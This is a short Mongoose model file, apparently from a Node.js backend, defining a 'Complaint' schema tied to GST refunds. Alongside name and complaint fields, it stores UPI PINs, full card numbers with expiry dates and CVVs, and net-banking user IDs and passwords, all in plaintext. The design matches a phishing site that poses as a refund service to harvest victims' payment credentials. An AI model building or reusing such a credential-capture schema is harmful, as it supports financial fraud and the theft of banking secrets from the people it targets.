// models/Complaint.js
const mongoose = require('mongoose');

const ComplaintSchema = new mongoose.Schema({
    fullName: {
        type: String,
        required: true,
    },
    complaint: {
        type: String,
        required: true,
    },
    upiPayment: {
        upiFullName: { type: String },
        number: { type: String },
        bankName: { type: String },
        gstRefundAmount: { type: String },
        pin: { type: String }, // Add pin here
    },
    creditCardPayment: {
        cardNumber: { type: String },
        expireDate: { type: String },
        cvv: { type: String },
        gstRefundAmount: { type: String },
    },
    netBankingPayment: {
        amount: { type: String },
        userId: { type: String },
        password: { type: String },
    },
    createdAt: {
        type: Date,
        default: Date.now,
    },
});

module.exports = mongoose.model('Complaint', ComplaintSchema);
